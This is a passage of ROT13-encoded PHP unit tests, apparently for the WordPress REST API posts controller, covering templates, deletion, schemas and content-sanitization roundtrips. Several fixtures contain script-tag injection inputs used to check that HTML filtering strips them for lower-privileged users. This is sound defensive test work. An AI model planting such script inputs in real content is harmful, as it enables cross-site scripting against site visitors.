		$pbagebyyre->ertvfgre_ebhgrf();
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = snyfr;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'grzcyngr' => 'cbfg-zl-grfg-grzcyngr.cuc',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn          = $erfcbafr->trg_qngn();
		$cbfg_grzcyngr = trg_cntr_grzcyngr_fyht( trg_cbfg( $qngn['vq'] ) );

		$guvf->nffregFnzr( 'cbfg-zl-grfg-grzcyngr.cuc', $qngn['grzcyngr'] );
		$guvf->nffregFnzr( 'cbfg-zl-grfg-grzcyngr.cuc', $cbfg_grzcyngr );
	}

	/**
	 * @gvpxrg 38877
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_grzcyngr_abar() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		nqq_svygre( 'gurzr_cbfg_grzcyngrf', neenl( $guvf, 'svygre_gurzr_cbfg_grzcyngrf' ) );
		hcqngr_cbfg_zrgn( frys::$cbfg_vq, '_jc_cntr_grzcyngr', 'cbfg-zl-grfg-grzcyngr.cuc' );

		// erertvfgre gur ebhgr nf jr abj unir n grzcyngr ninvynoyr.
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = gehr;
		$pbagebyyre                                     = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$pbagebyyre->ertvfgre_ebhgrf();
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = snyfr;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'grzcyngr' => '',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn          = $erfcbafr->trg_qngn();
		$cbfg_grzcyngr = trg_cntr_grzcyngr_fyht( trg_cbfg( $qngn['vq'] ) );

		$guvf->nffregFnzr( '', $qngn['grzcyngr'] );
		$guvf->nffregFnzr( '', $cbfg_grzcyngr );
	}

	/**
	 * Grfg hcqngr_vgrz() jvgu fnzr grzcyngr gung ab ybatre rkvfgf.
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::purpx_grzcyngr
	 * @gvpxrg 39996
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_fnzr_grzcyngr_gung_ab_ybatre_rkvfgf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		hcqngr_cbfg_zrgn( frys::$cbfg_vq, '_jc_cntr_grzcyngr', 'cbfg-zl-vainyvq-grzcyngr.cuc' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'grzcyngr' => 'cbfg-zl-vainyvq-grzcyngr.cuc',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn          = $erfcbafr->trg_qngn();
		$cbfg_grzcyngr = trg_cntr_grzcyngr_fyht( trg_cbfg( $qngn['vq'] ) );

		$guvf->nffregFnzr( 'cbfg-zl-vainyvq-grzcyngr.cuc', $cbfg_grzcyngr );
		$guvf->nffregFnzr( 'cbfg-zl-vainyvq-grzcyngr.cuc', $qngn['grzcyngr'] );
	}

	choyvp shapgvba irevsl_cbfg_ebhaqgevc( $vachg = neenl(), $rkcrpgrq_bhgchg = neenl() ) {
		// Perngr gur cbfg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		sbernpu ( $vachg nf $anzr => $inyhr ) {
			$erdhrfg->frg_cnenz( $anzr, $inyhr );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['enj'], $npghny_bhgchg['gvgyr']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['eraqrerq'], gevz( $npghny_bhgchg['gvgyr']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['enj'], $npghny_bhgchg['pbagrag']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['eraqrerq'], gevz( $npghny_bhgchg['pbagrag']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['rkprecg']['enj'], $npghny_bhgchg['rkprecg']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['rkprecg']['eraqrerq'], gevz( $npghny_bhgchg['rkprecg']['eraqrerq'] ) );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$cbfg = trg_cbfg( $npghny_bhgchg['vq'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['enj'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['enj'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['rkprecg']['enj'], $cbfg->cbfg_rkprecg );

		// Hcqngr gur cbfg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', $npghny_bhgchg['vq'] ) );
		sbernpu ( $vachg nf $anzr => $inyhr ) {
			$erdhrfg->frg_cnenz( $anzr, $inyhr );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['enj'], $npghny_bhgchg['gvgyr']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['eraqrerq'], gevz( $npghny_bhgchg['gvgyr']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['enj'], $npghny_bhgchg['pbagrag']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['eraqrerq'], gevz( $npghny_bhgchg['pbagrag']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['rkprecg']['enj'], $npghny_bhgchg['rkprecg']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['rkprecg']['eraqrerq'], gevz( $npghny_bhgchg['rkprecg']['eraqrerq'] ) );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$cbfg = trg_cbfg( $npghny_bhgchg['vq'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['enj'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['enj'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['rkprecg']['enj'], $cbfg->cbfg_rkprecg );
	}

	/**
	 * @qngnCebivqre qngn_cbfg_ebhaqgevc_nf_nhgube
	 */
	choyvp shapgvba grfg_cbfg_ebhaqgevc_nf_nhgube( $enj, $rkcrpgrq ) {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$guvf->nffregSnyfr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_cbfg_ebhaqgevc( $enj, $rkcrpgrq );
	}

	choyvp fgngvp shapgvba qngn_cbfg_ebhaqgevc_nf_nhgube() {
		erghea neenl(
			neenl(
				// Enj inyhrf.
				neenl(
					'gvgyr'   => '\b/ ¯\_(ツ)_/¯',
					'pbagrag' => '\b/ ¯\_(ツ)_/¯',
					'rkprecg' => '\b/ ¯\_(ツ)_/¯',
				),
				// Rkcrpgrq erghearq inyhrf.
				neenl(
					'gvgyr'   => neenl(
						'enj'      => '\b/ ¯\_(ツ)_/¯',
						'eraqrerq' => '\b/ ¯\_(ツ)_/¯',
					),
					'pbagrag' => neenl(
						'enj'      => '\b/ ¯\_(ツ)_/¯',
						'eraqrerq' => '<c>\b/ ¯\_(ツ)_/¯</c>',
					),
					'rkprecg' => neenl(
						'enj'      => '\b/ ¯\_(ツ)_/¯',
						'eraqrerq' => '<c>\b/ ¯\_(ツ)_/¯</c>',
					),
				),
			),
			neenl(
				// Enj inyhrf.
				neenl(
					'gvgyr'   => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
					'pbagrag' => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
					'rkprecg' => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				),
				// Rkcrpgrq erghearq inyhrf.
				neenl(
					'gvgyr'   => neenl(
						'enj'      => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
						'eraqrerq' => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
					),
					'pbagrag' => neenl(
						'enj'      => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
						'eraqrerq' => '<c>\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;</c>',
					),
					'rkprecg' => neenl(
						'enj'      => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
						'eraqrerq' => '<c>\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;</c>',
					),
				),
			),
			neenl(
				// Enj inyhrf.
				neenl(
					'gvgyr'   => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'pbagrag' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'rkprecg' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				// Rkcrpgrq erghearq inyhrf.
				neenl(
					'gvgyr'   => neenl(
						'enj'      => 'qvi <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
					),
					'pbagrag' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> bu abrf</c>\",
					),
					'rkprecg' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> bu abrf</c>\",
					),
				),
			),
			neenl(
				// Enj inyhrf.
				neenl(
					'gvgyr'   => '<n uers=\"#\" gnetrg=\"_oynax\" hasvygrerq=gehr>yvax</n>',
					'pbagrag' => '<n uers=\"#\" gnetrg=\"_oynax\" hasvygrerq=gehr>yvax</n>',
					'rkprecg' => '<n uers=\"#\" gnetrg=\"_oynax\" hasvygrerq=gehr>yvax</n>',
				),
				// Rkcrpgrq erghearq inyhrf.
				neenl(
					'gvgyr'   => neenl(
						'enj'      => '<n uers=\"#\">yvax</n>',
						'eraqrerq' => '<n uers=\"#\">yvax</n>',
					),
					'pbagrag' => neenl(
						'enj'      => '<n uers=\"#\" gnetrg=\"_oynax\">yvax</n>',
						'eraqrerq' => '<c><n uers=\"#\" gnetrg=\"_oynax\">yvax</n></c>',
					),
					'rkprecg' => neenl(
						'enj'      => '<n uers=\"#\" gnetrg=\"_oynax\">yvax</n>',
						'eraqrerq' => '<c><n uers=\"#\" gnetrg=\"_oynax\">yvax</n></c>',
					),
				),
			),
		);
	}

	choyvp shapgvba grfg_cbfg_ebhaqgevc_nf_rqvgbe_hasvygrerq_ugzy() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregSnyfr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_cbfg_ebhaqgevc(
				neenl(
					'gvgyr'   => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'pbagrag' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'rkprecg' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				neenl(
					'gvgyr'   => neenl(
						'enj'      => 'qvi <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
					),
					'pbagrag' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> bu abrf</c>\",
					),
					'rkprecg' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> bu abrf</c>\",
					),
				)
			);
		} ryfr {
			$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_cbfg_ebhaqgevc(
				neenl(
					'gvgyr'   => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'pbagrag' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'rkprecg' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				neenl(
					'gvgyr'   => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
						'eraqrerq' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					),
					'pbagrag' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
					),
					'rkprecg' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
					),
				)
			);
		}
	}

	choyvp shapgvba grfg_cbfg_ebhaqgevc_nf_fhcrenqzva_hasvygrerq_ugzy() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );

		$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_cbfg_ebhaqgevc(
			neenl(
				'gvgyr'   => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'pbagrag' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'rkprecg' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
			),
			neenl(
				'gvgyr'   => neenl(
					'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'eraqrerq' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				'pbagrag' => neenl(
					'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
				),
				'rkprecg' => neenl(
					'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
				),
			)
		);
	}

	choyvp shapgvba grfg_qryrgr_vgrz() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Qryrgrq cbfg' ) );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Qryrgrq cbfg', $qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( 'genfu', $qngn['fgnghf'] );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_fxvc_genfu() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Qryrgrq cbfg' ) );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erfcbafr         = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregAbgRzcgl( $qngn['cerivbhf'] );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_nyernql_genfurq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Qryrgrq cbfg' ) );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_nyernql_genfurq', $erfcbafr, 410 );
	}

	choyvp shapgvba grfg_qryrgr_cbfg_vainyvq_vq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/cbfgf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_qryrgr_cbfg_vainyvq_cbfg_glcr() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/cbfgf/' . $cntr_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_qryrgr_cbfg_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_ertvfgre_cbfg_glcr_vainyvq_pbagebyyre() {

		ertvfgre_cbfg_glcr(
			'vainyvq-pbagebyyre',
			neenl(
				'fubj_va_erfg'          => gehr,
				'erfg_pbagebyyre_pynff' => 'Snxr_Pynff_Onon',
			)
		);
		perngr_vavgvny_erfg_ebhgrf();
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlAbgUnfXrl( '/jc/i2/vainyvq-pbagebyyre', $ebhgrf );
		_haertvfgre_cbfg_glcr( 'vainyvq-pbagebyyre' );
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 27, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbzzrag_fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbagrag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rkprecg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'srngherq_zrqvn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'trarengrq_fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'thvq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'sbezng', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'yvax', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cnffjbeq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'creznyvax_grzcyngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cvat_fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgvpxl', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'grzcyngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'glcr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gntf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pngrtbevrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pynff_yvfg', $cebcregvrf );
	}

	/**
	 * @gvpxrg 48401
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn_vffhrf_qbvat_vg_jebat_jura_gnkbabzl_anzr_vf_nyernql_frg_va_cebcregvrf() {
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'ertvfgre_gnkbabzl' );

		// Ertvfgre n gnkbabzl jvgu 'fgnghf' nf anzr.
		ertvfgre_gnkbabzl( 'fgnghf', 'cbfg', neenl( 'fubj_va_erfg' => gehr ) );

		// Er-vavgvnyvmr gur pbagebyyre.
		$pbagebyyre = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$pbagebyyre->ertvfgre_ebhgrf();
	}

	/**
	 * @gvpxrg 39805
	 */
	choyvp shapgvba grfg_trg_cbfg_ivrj_pbagrkg_cebcregvrf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'ivrj' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$xrlf     = neenl_xrlf( $erfcbafr->trg_qngn() );
		fbeg( $xrlf );

		$rkcrpgrq_xrlf = neenl(
			'nhgube',
			'pngrtbevrf',
			'pynff_yvfg',
			'pbzzrag_fgnghf',
			'pbagrag',
			'qngr',
			'qngr_tzg',
			'rkprecg',
			'srngherq_zrqvn',
			'sbezng',
			'thvq',
			'vq',
			'yvax',
			'zrgn',
			'zbqvsvrq',
			'zbqvsvrq_tzg',
			'cvat_fgnghf',
			'fyht',
			'fgnghf',
			'fgvpxl',
			'gntf',
			'grzcyngr',
			'gvgyr',
			'glcr',
		);

		$guvf->nffregFnzr( $rkcrpgrq_xrlf, $xrlf );
	}

	choyvp shapgvba grfg_trg_cbfg_rqvg_pbagrkg_cebcregvrf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$xrlf     = neenl_xrlf( $erfcbafr->trg_qngn() );
		fbeg( $xrlf );

		$rkcrpgrq_xrlf = neenl(
			'nhgube',
			'pngrtbevrf',
			'pynff_yvfg',
			'pbzzrag_fgnghf',
			'pbagrag',
			'qngr',
			'qngr_tzg',
			'rkprecg',
			'srngherq_zrqvn',
			'sbezng',
			'trarengrq_fyht',
			'thvq',
			'vq',
			'yvax',
			'zrgn',
			'zbqvsvrq',
			'zbqvsvrq_tzg',
			'cnffjbeq',
			'creznyvax_grzcyngr',
			'cvat_fgnghf',
			'fyht',
			'fgnghf',
			'fgvpxl',
			'gntf',
			'grzcyngr',
			'gvgyr',
			'glcr',
		);

		$guvf->nffregFnzr( $rkcrpgrq_xrlf, $xrlf );
	}

	choyvp shapgvba grfg_trg_cbfg_rzorq_pbagrkg_cebcregvrf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rzorq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$xrlf     = neenl_xrlf( $erfcbafr->trg_qngn() );
		fbeg( $xrlf );

		$rkcrpgrq_xrlf = neenl(
			'nhgube',
			'qngr',
			'rkprecg',
			'srngherq_zrqvn',
			'vq',
			'yvax',
			'fyht',
			'gvgyr',
			'glcr',
		);

		$guvf->nffregFnzr( $rkcrpgrq_xrlf, $xrlf );
	}

	choyvp shapgvba grfg_fgnghf_neenl_rahz_netf() {
		$erdhrfg         = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2' );
		$erfcbafr        = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn            = $erfcbafr->trg_qngn();
		$yvfg_cbfgf_netf = $qngn['ebhgrf']['/jc/i2/cbfgf']['raqcbvagf'][0]['netf'];
		$fgnghf_net      = $yvfg_cbfgf_netf['fgnghf'];
		$guvf->nffregFnzr( 'neenl', $fgnghf_net['glcr'] );
		$guvf->nffregFnzr(
			neenl(
				'rahz' => neenl(
					'choyvfu',
					'shgher',
					'qensg',
					'craqvat',
					'cevingr',
					'genfu',
					'nhgb-qensg',
					'vaurevg',
					'erdhrfg-craqvat',
					'erdhrfg-pbasvezrq',
					'erdhrfg-snvyrq',
					'erdhrfg-pbzcyrgrq',
					'nal',
				),
				'glcr' => 'fgevat',
			),
			$fgnghf_net['vgrzf']
		);
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {

		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'cbfg',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		jc_frg_pheerag_hfre( 1 );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . $cbfg_vq );
